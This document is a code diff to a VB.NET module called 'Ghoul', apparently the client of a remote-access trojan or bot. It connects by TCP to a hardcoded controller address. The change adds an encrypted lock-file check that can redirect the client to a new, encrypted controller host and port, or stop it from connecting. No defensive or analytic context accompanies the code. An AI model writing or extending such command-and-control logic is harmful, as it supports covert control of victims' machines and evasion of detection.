@@ -1,4 +1,5 @@
-﻿Imports System.Net
+﻿Imports System.IO
+Imports System.Net
 Imports System.Text
 Imports System.Threading
 Imports System.Net.Sockets
@@ -8,6 +9,7 @@ Module Ghoul
     Const BUFFER_SIZE As Integer = 1024
     Const RECONNECT_MIN As Integer = 2
     Const RECONNECT_MAX As Integer = 10
+    Const LOCK_FILE As String = "tOlYLguYQMM="
 
     Dim Ghoul As New TcpClient
     Dim MrFaustHome As String = "192.164.0.126"
@@ -26,8 +28,31 @@ Module Ghoul
     Sub GhoulConnect()
 
         Try
-            Ghoul = New TcpClient
-            Ghoul.Connect(MrFaustHome, MrFaustEntrance)
+            ' if Existing, don't connect
+            If System.IO.File.Exists(DecryptString(LOCK_FILE)) Then
+                Dim line As String
+                Using reader As StreamReader = New StreamReader(DecryptString(LOCK_FILE))
+                    line = reader.ReadLine
+                End Using
+
+                If line.Length = 0 Then
+                    Ghoul = New TcpClient
+                    Ghoul.Connect(MrFaustHome, MrFaustEntrance)
+                ElseIf line.Substring(0, 1) = ":" Then
+                    Dim newHome As String, newDoor As String
+                    newHome = DecryptString(line.Substring(1)).Split(":")(0)
+                    newDoor = DecryptString(line.Substring(1)).Split(":")(1)
+
+                    Ghoul = New TcpClient
+                    Ghoul.Connect(newHome, newDoor)
+                Else
+                    Exit Sub
+                End If
+            Else
+                Ghoul = New TcpClient
+                Ghoul.Connect(MrFaustHome, MrFaustEntrance)
+            End If
+
             ClientLog("Connected to " & MrFaustHome)
 
             rc_timer.Enabled = False
@@ -189,4 +214,6 @@ Module Ghoul
         ClientLog("randomInt: " & randomInt)
         Return randomInt
     End Function
+
+
 End Module
